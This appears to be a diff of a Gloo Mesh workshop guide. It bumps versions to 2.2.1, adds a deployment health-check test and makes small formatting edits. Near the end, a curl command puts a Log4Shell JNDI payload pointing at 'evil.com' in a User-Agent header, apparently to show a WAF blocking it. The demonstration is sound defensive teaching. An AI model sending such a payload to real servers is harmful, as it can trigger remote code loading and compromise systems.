@@ -151,7 +151,7 @@ kubectl config use-context ${MGMT}
 First of all, let's install the `meshctl` CLI:
 
 ```bash
-export GLOO_MESH_VERSION=v2.2.0
+export GLOO_MESH_VERSION=v2.2.1
 curl -sL https://run.solo.io/meshctl/install | sh -
 export PATH=$HOME/.gloo-mesh/bin:$PATH
 ```
@@ -196,7 +196,7 @@ helm repo update
 kubectl --context ${MGMT} create ns gloo-mesh 
 helm upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise \
 --namespace gloo-mesh --kube-context ${MGMT} \
---version=2.2.0 \
+--version=2.2.1 \
 --set glooMeshMgmtServer.ports.healthcheck=8091 \
 --set legacyMetricsPipeline.enabled=false \
 --set metricsgateway.enabled=true \
@@ -217,7 +217,23 @@ until [[ $(kubectl --context ${MGMT} -n gloo-mesh get svc gloo-mesh-mgmt-server 
 done
 -->
 Then, you need to set the environment variable to tell the Gloo Mesh agents how to communicate with the management plane:
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
 
+describe("MGMT server is healthy", () => {
+  let cluster = process.env.MGMT
+  let deployments = ["gloo-mesh-mgmt-server","gloo-mesh-redis","gloo-metrics-gateway","prometheus-server"];
+  deployments.forEach(deploy => {
+    it(deploy + ' pods are ready in ' + cluster, () => helpers.checkDeployment({ context: cluster, namespace: "gloo-mesh", k8sObj: deploy }));
+  });
+});
+EOF
+echo "executing test dist/gloo-mesh-2-0-single-workspace-beta/build/templates/steps/deploy-and-register-gloo-mesh/tests/check-deployment.test.js.liquid"
+tempfile=$(mktemp)
+echo "saving errors in ${tempfile}"
+mocha ./test.js --timeout 10000 --retries=50 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
+-->
 <!--bash
 cat <<'EOF' > ./test.js
 const chaiExec = require("@jsdevtools/chai-exec");
@@ -314,7 +330,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set cluster=cluster1 \
   --set metricscollector.enabled=true \
   --set metricscollector.config.exporters.otlp.endpoint=\"${ENDPOINT_METRICS_GATEWAY}\" \
-  --version 2.2.0
+  --version 2.2.1
 ```
 
 Note that the registration can also be performed using `meshctl cluster register`.
@@ -351,7 +367,7 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
   --set cluster=cluster2 \
   --set metricscollector.enabled=true \
   --set metricscollector.config.exporters.otlp.endpoint=\"${ENDPOINT_METRICS_GATEWAY}\" \
-  --version 2.2.0
+  --version 2.2.1
 ```
 
 You can check the cluster(s) have been registered correctly using the following commands:
@@ -935,11 +951,12 @@ kubectl --context ${CLUSTER1} create ns bookinfo-frontends
 kubectl --context ${CLUSTER1} create ns bookinfo-backends
 kubectl --context ${CLUSTER1} label namespace bookinfo-frontends istio.io/rev=1-16
 kubectl --context ${CLUSTER1} label namespace bookinfo-backends istio.io/rev=1-16
+
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER1} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
-# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
+# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions less than v3
 kubectl --context ${CLUSTER1} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details),version notin (v3)'
 # Update the productpage deployment to set the environment variables to define where the backend services are running
 kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
@@ -948,6 +965,7 @@ kubectl --context ${CLUSTER1} -n bookinfo-frontends set env deploy/productpage-v
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER1}
 kubectl --context ${CLUSTER1} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER1}
 ```
+
 
 <!--bash
 until [[ $(kubectl --context ${CLUSTER1} -n bookinfo-frontends get deploy -o json | jq '[.items[].status.readyReplicas] | add') -eq 1 ]]; do
@@ -975,12 +993,13 @@ kubectl --context ${CLUSTER2} create ns bookinfo-frontends
 kubectl --context ${CLUSTER2} create ns bookinfo-backends
 kubectl --context ${CLUSTER2} label namespace bookinfo-frontends istio.io/rev=1-16
 kubectl --context ${CLUSTER2} label namespace bookinfo-backends istio.io/rev=1-16
+
 # deploy the frontend bookinfo service in the bookinfo-frontends namespace
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'account in (productpage)'
 kubectl --context ${CLUSTER2} -n bookinfo-frontends apply -f bookinfo.yaml -l 'app in (productpage)'
-# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions
 kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'account in (reviews,ratings,details)'
-kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details)'
+# deploy the backend bookinfo services in the bookinfo-backends namespace for all versions
+  kubectl --context ${CLUSTER2} -n bookinfo-backends apply -f bookinfo.yaml -l 'app in (reviews,ratings,details)'
 # Update the productpage deployment to set the environment variables to define where the backend services are running
 kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v1 DETAILS_HOSTNAME=details.bookinfo-backends.svc.cluster.local
 kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v1 REVIEWS_HOSTNAME=reviews.bookinfo-backends.svc.cluster.local
@@ -988,6 +1007,7 @@ kubectl --context ${CLUSTER2} -n bookinfo-frontends set env deploy/productpage-v
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v1 CLUSTER_NAME=${CLUSTER2}
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v2 CLUSTER_NAME=${CLUSTER2}
 kubectl --context ${CLUSTER2} -n bookinfo-backends set env deploy/reviews-v3 CLUSTER_NAME=${CLUSTER2}
+
 ```
 
 <!--bash
@@ -1212,7 +1232,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.2.0
+  --version 2.2.1
 
 helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --namespace gloo-mesh-addons \
@@ -1220,7 +1240,7 @@ helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
   --set glooMeshAgent.enabled=false \
   --set rate-limiter.enabled=true \
   --set ext-auth-service.enabled=true \
-  --version 2.2.0
+  --version 2.2.1
 ```
 
 This is how to environment looks like now:
@@ -1659,7 +1679,7 @@ kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 Now, the output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -1689,7 +1709,7 @@ kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -1856,7 +1876,7 @@ kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -1899,7 +1919,7 @@ kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
 
 The output should be like that:
 
-```
+```,nocopy
 ...
 Certificate chain
  0 s:
@@ -3458,7 +3478,7 @@ curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k "https://${ENDPOINT_HTTPS_GW
 
 The request should be rejected:
 
-```
+```,nocopy
 HTTP/2 403 
 content-length: 27
 content-type: text/plain
